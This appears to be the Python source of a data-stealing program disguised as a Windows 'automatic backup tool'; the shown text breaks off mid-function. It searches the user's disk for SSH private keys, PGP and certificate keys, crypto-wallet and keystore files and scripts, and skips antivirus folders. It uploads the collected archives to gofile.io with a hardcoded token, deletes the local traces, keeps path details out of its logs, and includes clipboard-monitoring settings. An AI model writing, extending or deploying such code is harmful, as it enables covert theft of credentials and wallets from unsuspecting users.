# -*- coding: utf-8 -*-
"""
Windows自动备份和上传工具
功能：备份Windows系统中的重要文件，并自动上传到云存储
"""

import os
import shutil
import time
import socket
import logging
import tarfile
import threading
import requests
import pyperclip
import getpass
from datetime import datetime, timedelta
from functools import lru_cache

class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1000  # 上传超时时间（秒）
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）
    CLIPBOARD_INTERVAL = 1200  # ZTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # ZTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # ZTB上传检查间隔（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # ZTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 文件操作配置
    SCAN_TIMEOUT = 600  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    PROGRESS_LOG_INTERVAL = 10  # 每N个文件记录一次进度
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户文档目录
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\AutoBackup')
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档类
        ".txt", ".xls", ".xlsx", ".et", ".one", ".js", ".py", ".go", ".sh", ".ts", ".jsx", ".tsx", 
        ".bash",  ".sol", ".rs", ".json", ".csv", ".wallet", ".bin", "ps1", ".rtf"
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
    ]
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [       
        # 游戏相关目录
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # 常见软件安装目录
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # 开发工具和环境
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
        ".gradle", ".m2", ".vs", ".vscode", ".idea",
        
        # 虚拟机和容器
        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
        "WSL", "docker", "containers",
        
        # 其他大型应用
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # 浏览器相关
        "Google", "Chrome", "Mozilla", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # 通讯和办公软件
        "Discord", "Zoom", "Teams", "Skype", "Slack",
        
        # 多媒体软件
        "Adobe", "Premiere", "Photoshop", "After Effects",
        "Vegas", "MAGIX", "Audacity",
        
        # 安全软件
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # 系统工具
        "CCleaner", "WinRAR", "7-Zip", "PowerToys"
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", 
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        
        # 游戏相关
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # 临时文件
        "log", "crash", "dumps", "report", "reports",
        
        # 其他
        "bak", "obsolete", "archive", "trojan", "clash", "vpn", "chrome",
        "thumb", "thumbnail", "preview" , "v2ray", "user", "mail"
    ]
    
    # 备用上传服务器
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

# 配置日志
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.api_token = "8HSdvkTfGNDxlhQFShQkkmJK2Yh8zWPQ"
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 自定义日志格式化器
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # 过滤掉路径相关的日志
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # 跳过路径相关的日志
                        if any(x in msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return None
                        # 保留进度和状态信息
                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "📁", "✅", "❌", "⏳", "📋"]):
                            return super().format(record)
                        # 其他普通日志
                        return super().format(record)
                    return super().format(record)
            
            # 自定义过滤器
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # 过滤掉路径相关的日志
                        if any(x in record.msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return False
                    return True
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """检查是否应该排除目录
        
        Args:
            path: 目录路径
            
        Returns:
            bool: 是否应该排除
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 优先检查是否是云盘目录，如果是则不排除
        cloud_keywords = [
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        ]
        
        # 检查路径中的每个部分
        for part in path_parts:
            part_lower = part.lower()
            # 如果任何部分包含云盘关键词，则不排除该目录
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # 检查完整目录名是否在排除列表中
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # 检查每个路径部分
            for part in path_parts:
                # 标准化路径部分
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # 只有当排除目录名完全匹配时才排除
                if ex_parts == part_normalized:
                    return True
        
        # 对每个关键词进行更智能的匹配
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # 检查每个路径部分
            for part in path_parts:
                # 1. 标准化路径部分，移除所有常见分隔符
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # 特殊处理cache关键词
                                    .lower())
                
                # 2. 分割成单词
                word_parts = set(normalized_part.split())
                
                # 3. 标准化关键词
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. 检查各种匹配情况
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # 直接包含
                    keyword_lower in word_parts,  # 作为独立单词存在
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # 所有关键词部分都存在
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windows磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份目录:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")
            logging.debug(f"扩展名类型: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 磁盘源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"使用的文件扩展名: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # 已扫描目录数
        excluded_dirs = 0   # 已排除目录数

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"❌ 扫描目录超时: {source_dir}")
                    break
                    
                # 定期显示进度
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⏳ 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
                        logging.debug(f"⏳ 当前扫描: {root}")
                    last_progress_time = current_time
                
                # 跳过目标目录
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # 跳过排除的目录
                if self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self.config.DEBUG_MODE:
                        logging.debug(f"排除目录: {root}")
                    dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    file_lower = file.lower()
                    # 检查文件扩展名
                    if not any(file_lower.endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过空文件: {source_file}")
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"获取文件大小失败: {source_file} - {str(e)}")
                        continue

                    # 尝试复制文件
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"文件访问失败: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"创建目标子目录失败: {target_sub_dir}")
                                break
                                
                            # 使用优化的分块复制（1MB块大小）
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
                                    logging.debug(f"📁 已备份 {files_count} 个文件 ({total_size / 1024 / 1024:.1f}MB)")
                                logging.debug(f"成功复制: {source_file} -> {target_file}")
                            
                            break  # 成功后跳出重试循环
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
                        except (MemoryError, RuntimeError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                logging.error(f"❌ 文件复制出现系统错误: {source_file} - {str(e)}")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 备份过程出错: {str(e)}")
        except (MemoryError, RuntimeError) as e:
            logging.error(f"❌ 备份过程出现系统错误: {str(e)}")

        # 显示最终统计信息
        if files_count > 0:
            logging.info(f"\n📊 备份完成:")
            logging.info(f"   📁 文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
                logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"扫描统计:")
                logging.debug(f"- 扫描目录数: {scanned_dirs}")
                logging.debug(f"- 排除目录数: {excluded_dirs}")
            logging.error(f"❌ 未找到需要备份的文件")
            return None
    
    def _get_upload_server(self):
        """获取上传服务器地址
    
        Returns:
            str: 上传服务器URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # 删除原始大文件
            self._safe_remove_file(file_path, retry=False)
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 清理分片目录
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """上传单个文件
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)  # 删除过大的文件
                return False

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.info(f"✅ 文件上传成功: {os.path.basename(file_path)}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    logging.error(f"服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except (ValueError, KeyError) as e:
                                logging.error(f"服务器返回无效JSON数据: {str(e)}")
                        else:
                            logging.error(f"上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    logging.error(f"上传超时 (服务器: {current_server})")
                except requests.exceptions.SSLError as e:
                    logging.error(f"SSL错误 (服务器: {current_server}): {str(e)}")
                except requests.exceptions.ConnectionError as e:
                    logging.error(f"连接错误 (服务器: {current_server}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"请求异常 (服务器: {current_server}): {str(e)}")
                except (OSError, IOError) as e:
                    logging.error(f"文件读取错误: {str(e)}")
                except Exception as e:
                    logging.error(f"上传出现未知错误: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            # 无论上传成功还是失败，都尝试删除文件
            self._safe_remove_file(file_path, retry=True)

            if not upload_success:
                logging.error("❌ 上传失败，已达到最大重试次数")
                return False
                
            return True

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            # 发生错误时也尝试删除文件
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 使用更保守的压缩比例估算（假设压缩后为原始大小的70%）
            COMPRESSION_RATIO = 0.7
            # 为了确保安全，将目标大小设置为限制的70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # 先收集所有文件信息
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # 按文件大小降序排序
            all_files.sort(key=lambda x: x[2], reverse=True)

            # 检查是否有单个文件超过限制
            for file_path, _, file_size in all_files[:]:  # 使用切片创建副本以避免在迭代时修改列表
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"单个文件过大: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # 使用最优匹配算法进行分组
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # 如果当前文件会导致当前块超过限制，创建新块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # 压缩分块，使用更高的压缩级别
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # 如果压缩后仍然过大，尝试将当前块再次分割
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # 递归处理前半部分
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # 递归处理后半部分
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"分块 {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # 添加文件到当前块
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
